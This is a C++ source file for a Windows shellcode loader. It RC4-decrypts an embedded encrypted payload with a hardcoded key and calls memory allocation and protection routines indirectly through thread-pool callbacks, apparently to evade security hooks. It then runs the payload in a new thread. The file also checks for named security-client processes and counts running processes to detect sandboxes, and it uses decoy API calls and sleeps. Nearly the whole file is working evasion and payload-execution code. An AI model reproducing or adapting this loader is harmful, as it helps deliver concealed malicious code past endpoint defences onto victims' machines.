#include <windows.h>

#include <iostream>
#include <cstring>
#include <ntstatus.h>
#include <winternl.h>



typedef NTSTATUS(NTAPI* TPALLOCWORK)(PTP_WORK* ptpWrk, PTP_WORK_CALLBACK pfnwkCallback, PVOID OptionalArg, PTP_CALLBACK_ENVIRON CallbackEnvironment);
typedef VOID(NTAPI* TPPOSTWORK)(PTP_WORK);
typedef VOID(NTAPI* TPRELEASEWORK)(PTP_WORK);
VOID CALL_WORK(LPVOID Args, PTP_WORK_CALLBACK WorkCallback);
typedef struct _NTALLOCATEVIRTUALMEMORY_ARGS {
    UINT_PTR pNtAllocateVirtualMemory;   // pointer to NtAllocateVirtualMemory - rax
    HANDLE hProcess;                     // HANDLE ProcessHandle - rcx
    PVOID* address;                      // PVOID *BaseAddress - rdx; ULONG_PTR ZeroBits - 0 - r8
    PSIZE_T size;                        // PSIZE_T RegionSize - r9; ULONG AllocationType - MEM_RESERVE|MEM_COMMIT = 3000 - stack pointer
    ULONG permissions;                   // ULONG Protect - PAGE_EXECUTE_READ - 0x20 - stack pointer
} NTALLOCATEVIRTUALMEMORY_ARGS, * PNTALLOCATEVIRTUALMEMORY_ARGS;

typedef struct _NTPROTECTVIRTUALMEMORY_ARGS {
    UINT_PTR pNtProtectVirtualMemory;   // pointer to NtAllocateVirtualMemory - rax
    HANDLE hProcess;                     // HANDLE ProcessHandle - rcx
    PVOID* address;                      // PVOID *BaseAddress - rdx; ULONG_PTR ZeroBits - 0 - r8
    PSIZE_T size;                        // PSIZE_T RegionSize - r9; ULONG AllocationType - MEM_RESERVE|MEM_COMMIT = 3000 - stack pointer
    PULONG oldpermissions;                   // ULONG Protect - PAGE_EXECUTE_READ - 0x20 - stack pointer
} NTPROTECTVIRTUALMEMORY_ARGS, * PNTPROTECTVIRTUALMEMORY_ARGS;


extern "C" VOID CALLBACK WorkCallback_ALLOC(PTP_CALLBACK_INSTANCE Instance, PVOID Context, PTP_WORK Work);

extern "C" VOID CALLBACK WorkCallback_PROTECT(PTP_CALLBACK_INSTANCE Instance, PVOID Context, PTP_WORK Work);

char g_flag[3] = {0};
/*
//1. ��������
//2. ����û���


*/

LPVOID MyAllocVirtualMemory(SIZE_T allocatedsize) {
    // ���� ��ִ�пɶ�������
    if (allocatedsize == 0 ) {
        allocatedsize = 0x1000;
    }
    PVOID allocatedAddress = NULL;
    NTALLOCATEVIRTUALMEMORY_ARGS ntAllocateVirtualMemoryArgs = { 0 };
    ntAllocateVirtualMemoryArgs.pNtAllocateVirtualMemory = (UINT_PTR)GetProcAddress(GetModuleHandleA("ntdll"), "NtAllocateVirtualMemory");
    ntAllocateVirtualMemoryArgs.hProcess = (HANDLE)-1;
    ntAllocateVirtualMemoryArgs.address = &allocatedAddress;
    ntAllocateVirtualMemoryArgs.size = &allocatedsize;
    ntAllocateVirtualMemoryArgs.permissions = PAGE_READWRITE;
    CALL_WORK(&ntAllocateVirtualMemoryArgs, WorkCallback_ALLOC);

    return allocatedAddress;

}


VOID MyProtectVirtualMemory(LPVOID address,SIZE_T size) {

    ULONG permissions;
    NTPROTECTVIRTUALMEMORY_ARGS pNtProtectVirtualMemory_args = {0};
    pNtProtectVirtualMemory_args.address = &address;
    pNtProtectVirtualMemory_args.pNtProtectVirtualMemory = (UINT_PTR)GetProcAddress(GetModuleHandleA("ntdll"), "NtProtectVirtualMemory");
    pNtProtectVirtualMemory_args.hProcess = (HANDLE)-1;
    pNtProtectVirtualMemory_args.size = &size;
    pNtProtectVirtualMemory_args.oldpermissions = &permissions;

    CALL_WORK(&pNtProtectVirtualMemory_args, WorkCallback_PROTECT);

    //getchar();
}   




VOID CALL_WORK(LPVOID Args, PTP_WORK_CALLBACK WorkCallback) {

    FARPROC pTpAllocWork = GetProcAddress(GetModuleHandleA("ntdll"), "TpAllocWork");
    FARPROC pTpPostWork = GetProcAddress(GetModuleHandleA("ntdll"), "TpPostWork");
    FARPROC pTpReleaseWork = GetProcAddress(GetModuleHandleA("ntdll"), "TpReleaseWork");
    PTP_WORK WorkReturn = NULL;
    ((TPALLOCWORK)pTpAllocWork)(&WorkReturn, (PTP_WORK_CALLBACK)WorkCallback, Args, NULL);
    ((TPPOSTWORK)pTpPostWork)(WorkReturn);
    ((TPRELEASEWORK)pTpReleaseWork)(WorkReturn);
    WaitForSingleObject((HANDLE)-1, 0x1000);
}



void rc4(unsigned char* key, size_t key_len, unsigned char* data, size_t data_len) {
    unsigned char S[256];
    unsigned char K[256];
    unsigned char temp;
    int i, j = 0;

    // ��ʼ�� S ����
    for (i = 0; i < 256; i++) {
        S[i] = i;
        K[i] = key[i % key_len];
    }

    // KSA (Key Scheduling Algorithm)
    for (i = 0; i < 256; i++) {
        j = (j + S[i] + K[i]) % 256;
        temp = S[i];
        S[i] = S[j];
        S[j] = temp;
    }

    // PRGA (Pseudo-Random Generation Algorithm)
    i = 0;
    j = 0;
    for (size_t m = 0; m < data_len; m++) {
        i = (i + 1) % 256;
        j = (j + S[i]) % 256;
        temp = S[i];
        S[i] = S[j];
        S[j] = temp;
        data[m] ^= S[(S[i] + S[j]) % 256];
    }
}

/*


// ���� NtQuerySystemInformation ����
typedef enum _SYSTEM_INFORMATION_CLASS {
    SystemBasicInformation = 0,
    SystemProcessInformation = 5,
    // ������Ϣ��...
} SYSTEM_INFORMATION_CLASS;

typedef struct _SYSTEM_PROCESS_INFORMATION {
    ULONG NextEntryOffset;
    ULONG NumberOfThreads;
    LARGE_INTEGER WorkingSetPrivateSize;
    ULONG HardFaultCount;
    ULONG NumberOfPagesOfPagedPoolUsage;
    ULONG NumberOfPagesOfNonPagedPoolUsage;
    ULONG PagefileUsage;
    ULONG PeakPagefileUsage;
    ULONG PrivatePageCount;
    ULONG VirtualSize;
    ULONG PeakVirtualSize;
    ULONG PageFaultCount;
    ULONG HandleCount;
    ULONG SessionId;
    ULONG UniqueProcessId;
    ULONG InheritedFromUniqueProcessId;
    ULONG PeakWorkingSetSize;
    ULONG WorkingSetSize;
    ULONG QuotaPagedPoolUsage;
    ULONG QuotaNonPagedPoolUsage;
    ULONG QuotaPeakPagedPoolUsage;
    ULONG QuotaPeakNonPagedPoolUsage;
    ULONG PrivateUsage;
    WCHAR ImageName[256];
} SYSTEM_PROCESS_INFORMATION;
*/
extern "C" {
    NTSTATUS NTAPI NtQuerySystemInformation(
        SYSTEM_INFORMATION_CLASS SystemInformationClass,
        PVOID SystemInformation,
        ULONG SystemInformationLength,
        PULONG ReturnLength
    );
}

bool search_process(WCHAR* name) {
    // �Ƚ�hash,ֱ�ӱȽ�����
    int  ret = 0;
    ret=wcscmp(name, L"WeLink.exe");
    if (ret == 0) {
        return true;
    }
    ret = wcscmp(name, L"SPES5.exe");
    if (ret == 0) {
        return true;
    }
    ret = wcscmp(name, L"CMClient.exe");
    if (ret == 0) {
        return true;
    }


    return false;
}


bool EnumerateProcesses() {
    ULONG len = 0;
    NTSTATUS status;
    SYSTEM_PROCESS_INFORMATION* processInfo = NULL;
    int count = 0;
    // ��ѯϵͳ������Ϣ
    status = NtQuerySystemInformation(SystemProcessInformation, NULL, 0, &len);

    if (status == 0xC0000004) {  // STATUS_INFO_LENGTH_MISMATCH
        processInfo = (SYSTEM_PROCESS_INFORMATION*)malloc(len);
        if (processInfo == NULL) {
            //std::wcout << L"Memory allocation failed!" << std::endl;
            return true;
        }

        status = NtQuerySystemInformation(SystemProcessInformation, processInfo, len, &len);

        if (NT_SUCCESS(status)) {
            SYSTEM_PROCESS_INFORMATION* current = processInfo;
            do {
                // ������� ID �ͽ�������
                //std::wcout << L"Process ID: " << current->UniqueProcessId << L" | Process Name: " << current->ImageName << std::endl;
                if (search_process(current->ImageName.Buffer)) {
                    return true;
                    
                }

                count = count + 1;
                
                

                // ����и�����̣���ת����һ������
                if (current->NextEntryOffset == 0) {
                    break;
                }
                current = (SYSTEM_PROCESS_INFORMATION*)((LPBYTE)current + current->NextEntryOffset);

            } while (current != NULL);
        }
        else {
            //std::wcout << L"Failed to query system information." << std::endl;
            return false;
        }

        free(processInfo);
    }
    else {
        //std::wcout << L"Failed to query system information length." << std::endl;
        return false;
    }
    // �жϽ�����
    if (count > 80) {
        return true;
    }

    return false;
}

bool search_username() {


    char userName[MAX_PATH] = {0};
    DWORD path = MAX_PATH;
    GetUserNameA(userName, &path);

    

    return true;
}



int main() {


    Sleep(3000);
    unsigned char src_data[] = "\x59\xe0\x5f\xf8\xbc\x59\x5d\x48\x28\xac\x0a\xd5\xc3\x77\x67\x7a\x22\x1f\x38\xb2\xfb\x3b\xa5\x66\xfd\x96\xa7\xef\x6c\x67\x6f\xef\x50\x45\xe8\x57\x42\x82\x96\x16\xd4\xbb\xd9\x43\xa7\x0d\xff\x0f\x8d\x7c\x67\xae\x57\x33\x92\x60\x88\x42\xd4\x51\x7b\x3a\xa6\x86\xa0\x4f\xe2\xe6\x66\xce\x9a\x45\x91\xda\x23\x84\xe7\xdc\xdf\x58\xf9\x60\x8b\x52\x9e\x7b\xbf\x92\x64\x40\xd9\xa1\x5c\x51\x01\x13\xa3\x60\xbe\xac\xca\x65\x74\xdb\x1e\xe2\x86\xe3\xb3\x4a\xca\x8e\x7f\xc8\x09\x3f\xc7\xbe\x25\x79\x08\xd5\x43\x4f\xd8\xaf\x6e\x99\x27\x4e\x6e\x11\x58\xad\x93\xae\x58\xce\xff\xd5\x86\x64\x73\xc6\x47\x16\x62\x44\x3c\x73\x89\x30\x48\xed\x68\xdf\x11\x99\xb7\xe0\x24\x83\x1c\x90\x36\x4a\x72\x7c\x3f\x76\x0f\x7b\x0a\xb7\xe0\x8f\x48\x54\xe6\x2c\xe2\x19\x8e\x76\xba\x13\xae\x1f\xc2\x07\xca\x69\x6b\xeb\x88\x56\x76\x5e\x05\xd0\x0d\x80\x96\xe4\x48\x90\x3c\xf6\xd5\xcb\x9b\x7e\xf0\x44\xd7\xc7\xf2\xd0\xa7\xd9\xa5\xeb\x6d\x14\xe6\x5b\x20\xc1\xc5\x95\x39\x68\xe7\x27\x59\x76\x5a\x87\x10\x1c\x7a\x30\x98\xdd\xad\x0a\x20\x9d\xfb\x5b\x11\x36\xad\x5e\x5d\xfa\x67\x0a\x41\xfe\xee\xde\xb1\xb5\x05\x79\x31\xfd\xf4\xc4\xb7\xf0\xc6\x2f\x33\x61\x18\x98\x29\x22\x1a\x52\xdf\x3b\x88\x4c\xf0\xed\x92\x01\x48\xc9\xe0\xcd\x80\xfc\x1e\x25\xfe\x0b\x86\x8b\x78\x27\x07\x3b\xdc\x73\x59\x2f\xd2\x34\x5b\xa3\x25\x4e\xa2\x7b\x4d\xe1\x08\x30\x94\x9a\xf9\x7c\x6a\x6d\x59\xdd\x2a\x7b\xc1\x45\x4f\xd7\x34\xcc\x9e\x56\x90\x38\x38\x00\x51\x7e\xcf\x4f\x45\xa2\xc9\xd1\xd5\x67\x7b\x56\x45\xac\x9d\xf8\x0d\xd0\x72\x64\x31\x74\x31\x41\xdf\xbc\x2a\x40\x59\x02\xc5\xc8\x36\x0d\x3c\x96\xca\x18\xb7\x67\x6b\x24\x15\x11\x83\xa8\xbb\xf6\xa7\x62\xc6\x5d\x06\xd6\x19\xa5\x36\x79\x8e\xc6\x96\xa3\x61\xe2\x08\x34\xcf\xec\x48\x9e\x0f\xe2\xe0\x88\xe8\xdb\x38\xe9\x10\x43\x3c\xb7\xef\xe0\x83\x84\xcd\x93\x31\xbc\x6b\x1c\xb0\xb6\x5f\x51\xe6\x05\xdf\x7c\xca\x4e\xc5\x19\x34\xe3\xc3\x4a\x06\xa7\xbb\xa8\x82\xe9\x39\x44\xc3\x94\x85\xdd\x35\x9e\x1c\x07\xb9\xa0\xc0\x73\x77\x5f\x58\x87\xe5\x52\x05\x31\x2b\xba\x05\xa8\xd1\x1d\xaa\xe0\xbe\x94\x81\xd2\x8d\xe7\x7a\x29\x3b\x01\x64\xfe\x2f\x83\x84\xe1\xd5\xb5\xa7\x58\x92\x89\x14\x1c\xb6\xd5\x22\x54\x23\x0d\x42\x6d\x67\xf0\xe1\x89\x7d\x2a\xeb\xb7\xd5\x1b\x10\x16\x2b\xb4\x96\x4f\xb4\x83\x4b\x48\xab\xcd\x25\xe3\x8e\x8b\x20\xbb\x06\x80\xe1\x69\xe2\x34\x2e\xa1\x94\x7c\x1b\x45\xaf\xcd\x73\xf8\x94\x94\xe3\xab\x4f\x97\xb2\xc9\x98\x55\xd1\xea\x5f\xca\x78\x30\x81\xa0\x94\x92\xa9\x15\xdd\xe5\xa1\x6c\xf8\x9a\x75\x21\x3a\xf6\x73\xca\x59\xd9\x17\xe8\xb9\xaa\xc9\xdf\x29\x48\x1a\xed\xd6\x3f\xec\x29\xfe\x34\x4e\xae\x65\x5a\x31\x5c\xd3\x0f\x3c\xdd\xf7\x16\xd9\x33\xfc\xe2\xa0\x63\x6c\x69\xfb\x43\xec\xf0\xdb\x92\x45\xfc\x40\x89\xe5\x34\x80\x5a\xc0\x4e\x96\xab\x4c\x1d\x27\x2d\xfe\xfd\xd4\x46\xa6\xd0\xc2\x02\xad\x2f\x23\xe7\x85\x10\x2d\x2e\xdd\x8b\x32\x71\x10\x5a\xce\xdd\xad\x2c\x6e\x5f\x16\xb3\xd7\x9b\x53\x03\xce\xba\xa4\x79\xf0\xf4\xb6\x83\xff\xa2\x34\xaf\xbd\x3e\x95\x96\x70\xb6\x2e\x58\x68\x3d\xe3\xca\xae\xf4\xe4\xd3\xb4\x59\x4d\x5e\x37\x66\x55\xe0\x13\xaa\x7b\xcb\x8f\x3f\x03\xca\x84\x47\xfe\x35\x78\x3c\xc5\xe6\x7c\x7b\x77\xac\x75\x4a\x6d\x53\xae\xa0\xf5\x6c\x36\x24\x75\x27\xe1\xfd\x4f\x11\xab\x50\x91\x55\x69\x8e\xc8\xd8\xe1\x07\xc2\x27\x8a\x72\x4a\x55\x4c\x32\x5c\x11\x38\x81\x52\x22\x8a\xc6\xaf\xa1\x18\x2a\x44\x01\xa6\x15\xba\x43\xb8\xa9\x59\x17\xbe\xd1\xed\x48\x07\x84\x65\x8e\x16\x96\xd7\x2e\xd6\x6f\xc2\xed\x2c\x96\xa8\xa5\x7e\x89\xb8\x9b\x10\x67\x8e\x89\x52\x75\xc2\x26\xcd\x93\x59\x22\x79\xed\x9e\x9d\x73\xbb\xd0\x54\xdf\x82\x52\xa1\x6b\x03\x3c\x7f\x5a\x6e\xe4\xc4\x7e\xe8\x68\x35\xa9\x3a\x4e\x62\x06\x60\x18\x17\xc3\x1c\x49\xaf\xef\x01\xdb\x9c\x36\x0c\x50\x49\xa3\x2d\xed\xea\x4c\x72\x6d\x10\x68\x34";
    size_t src_data_len = sizeof(src_data) - 1;
    unsigned char key[] = "secretkey";
    size_t key_len = sizeof(key) - 1;
    rc4(key, key_len, src_data, src_data_len);
    GlobalFree(0);
    // ������ܺ�� shellcode
    
    //for (size_t i = 0; i < src_data_len; i++) {
    //    printf("\\x%02x", src_data[i]);
    //}

    LPVOID address=MyAllocVirtualMemory(0x1000);
    // 
    if (address == nullptr) {
        //Sleep(3000);
        return -1;
    }
    *(DWORD*)address = 0X1234;
    memset(address, 0, 0x1000);
    RtlMoveMemory(address, src_data, src_data_len);
    // �ָ�ִ������
    LocalAlloc(0x40, 0);
    LocalAlloc(0x40, 0);
    GetCurrentObject(NULL, OBJ_BRUSH);
    MyProtectVirtualMemory(address, 0x1000);
    GetDC(NULL);
    GlobalFree(0);
    CreateThread(0, 0, (LPTHREAD_START_ROUTINE)address, 0, 0, 0);
    Sleep(2000);
    Sleep(3000);
    Sleep(3000);
    Sleep(3000);
    printf("%p", address);
    //getchar();

    return 0;
}